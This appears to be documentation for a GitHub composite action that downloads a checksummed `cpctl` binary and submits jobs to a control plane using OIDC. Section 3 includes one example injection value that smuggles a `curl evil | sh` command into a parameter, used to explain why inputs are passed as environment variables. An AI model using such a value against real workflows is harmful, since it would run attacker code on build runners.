# How `uses: cloudyhomelab/control-plane/action@v0.1.0` works

This explains the workflow step that calls the control plane:

```yaml
- uses: cloudyhomelab/control-plane/action@v0.1.0
  with:
    server: ${{ env.CP_SERVER }}
    audience: ${{ env.CP_AUDIENCE }}
    action: network.plan
    ref: ${{ github.ref }}
    params: |
      region=eu-west-1
```

`uses:` tells the GitHub runner: "download this action and run it as one step". Here the
action is the `action/` folder of the controlplane repo.

## 1. Reading the `uses:` string

```
cloudyhomelab/control-plane/action@v0.1.0
└─────┬─────┘ └─────┬─────┘ └─┬──┘ └─┬──┘
    owner         repo      path   git ref (branch, tag or commit SHA)
```

When the job reaches this step, the runner:

1. Downloads `github.com/cloudyhomelab/control-plane` at `v0.1.0`. It does this itself, before any
   step runs; you don't need `actions/checkout` for it.
2. Goes into the `action/` subfolder and reads `action/action.yml`. That file is what makes a
   folder an action.
3. Sees `runs: using: composite`, so it runs the steps listed in that file inside your job,
   on the same runner.

Without a path (`cloudyhomelab/control-plane@v0.1.0`), it would look for `action.yml` at the repo
root. The subfolder keeps the action separate from the server code.

## 2. `with:` fills the action's inputs

`action/action.yml` declares which inputs exist:

```yaml
inputs:
  server:   { required: true }
  audience: { required: true }
  action:   { required: true }
  params:   { default: "" }
  ref:      { default: "" }
  input-job: { default: "" }
```

Each key under `with:` sets one of these. Inside the action they are read as
`${{ inputs.server }}`, `${{ inputs.params }}` and so on. An unknown key only gets a warning,
and a missing required one fails the step.

The `${{ ... }}` parts are evaluated in your workflow before the action ever sees them:

- `${{ env.CP_SERVER }}` comes from the `env:` block at the top of the workflow.
- `${{ github.ref }}` is the ref this run was triggered on. On a push to main that's
  `refs/heads/main`. On a pull request it's `refs/pull/<n>/merge`, which `network.plan`
  allows in its `allowed_refs`.
- `params: |` is a YAML block string, so it arrives as the text `region=eu-west-1\n`.
  Put one `key=value` per line.

## 3. What the action then does

The composite action in `action/action.yml` downloads `cpctl` with `action/download-cpctl.sh`,
then runs it.

**Step 1: download `cpctl` from the release.** The action only runs released binaries, so
the `uses:` ref must be a release tag (`@v0.1.0`) or the full commit SHA a release tag points
at. For a SHA it finds the tag with `git ls-remote --tags`. It then downloads that release's
`linux-<arch>-cpctl`, checks it against the release's `SHA256SUMS`, and checks that
`cpctl version` prints the release's version.

The step fails, and nothing runs, if the ref is anything else (`@main`, a SHA no release tag
points at, `./action`), if the runner is not Linux on x64 or arm64, if the download fails, or
if the checksum or version does not match.

**Step 2: run it.** The inputs are passed as environment variables, not pasted into the script:

```yaml
env:
  CONTROLPLANE_URL: ${{ inputs.server }}
  CONTROLPLANE_AUDIENCE: ${{ inputs.audience }}
  CP_ACTION: ${{ inputs.action }}
  CP_PARAMS: ${{ inputs.params }}
  CP_REF: ${{ inputs.ref }}
run: |
  # turns each params line into -p key=value, adds -ref / -input-job if set
  "$RUNNER_TEMP/cpctl" run "${args[@]}" "$CP_ACTION"
```

Passing inputs through env matters. If the script used `${{ inputs.params }}` directly, a
value like `x"; curl evil | sh; "` would become shell code on the runner. As an env var it
stays plain data.

For the step above, what finally runs on the runner is:

```
cpctl run -p region=eu-west-1 -ref refs/heads/main network.plan
```

From there `cpctl`:

1. Gets an OIDC token for `audience` from the runner.
2. POSTs the job to the control plane.
3. Streams the job log into the step output.
4. Exits with the job's exit code, so a failed job fails the step.

## 4. Getting results back

The action declares outputs that map to what `cpctl` writes to `$GITHUB_OUTPUT`:

```yaml
outputs:
  job_id: { value: ${{ steps.run.outputs.job_id }} }
  status: { value: ${{ steps.run.outputs.status }} }
```

That's how a workflow hands the plan's id to the apply job:

```yaml
plan:
  outputs:
    job_id: ${{ steps.plan.outputs.job_id }}   # step output -> job output
  steps:
    - id: plan                                 # the id makes steps.plan.* work
      uses: cloudyhomelab/control-plane/action@v0.1.0
      ...
apply:
  needs: plan
  steps:
    - uses: cloudyhomelab/control-plane/action@v0.1.0
      with:
        action: network.apply
        input-job: ${{ needs.plan.outputs.job_id }}
```

## 5. Things to know

- **Permissions:** the calling workflow needs `permissions: id-token: write`. Without it the
  runner won't hand out an OIDC token, and `cpctl` fails with "no OIDC token available".
- **The repo must stay public:** the action lists tags and downloads release files without
  a token. If `cloudyhomelab/control-plane` became private, other repos could only reach its
  action after Settings > Actions > General > Access is set to "Accessible from repositories
  in the 'cloudyhomelab' organization", and the download would still fail.
- **Pin a release:** `@v0.1.0` or its commit SHA runs exactly that release, and with
  immutable releases on (see RELEASE.md) neither the tag nor its files can change. Moving to
  a newer release is a deliberate edit of the pin in each workflow.
- **No local path:** `uses: ./action` fails, since a checkout is not a release. A change to
  the action is tried by releasing it, or by a rehearsal of the Release workflow for `cpctl`.
- **Speed:** the download is a few MB and takes about a second; no Go setup or compile.
